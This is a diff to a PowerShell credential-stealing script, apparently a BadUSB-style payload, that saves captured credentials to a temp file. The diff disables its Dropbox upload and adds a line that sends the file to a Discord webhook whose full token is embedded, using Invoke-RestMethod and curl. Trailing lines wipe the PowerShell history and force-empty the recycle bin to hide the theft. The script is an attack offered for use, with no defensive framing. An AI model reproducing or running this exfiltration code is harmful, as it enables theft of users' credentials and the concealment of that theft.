@@ -38,8 +38,8 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
- 
+#$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileName = "credential.txt"
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
@@ -139,6 +139,7 @@ echo $creds >> $env:TMP\$FileName
 	This is to upload your files to dropbox
 #>
 
+<#
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FilFeName"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -147,10 +148,9 @@ $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
+#>
 
-
-#####Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-STRING $url="https://discord.com/api/webhooks/1042452496423063582/nHFRhkJWFJa1Daa6VChkIOg4SmURaZwcGH8bWNkv_6HLPGQEftPQ7k6_CwOlXVIQpa2V";Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$SourceFilePath" $url
+$url="https://discord.com/api/webhooks/1042452496423063582/nHFRhkJWFJa1Daa6VChkIOg4SmURaZwcGH8bWNkv_6HLPGQEftPQ7k6_CwOlXVIQpa2V";Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$env:TMP\$FileName" $url
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -175,4 +175,3 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
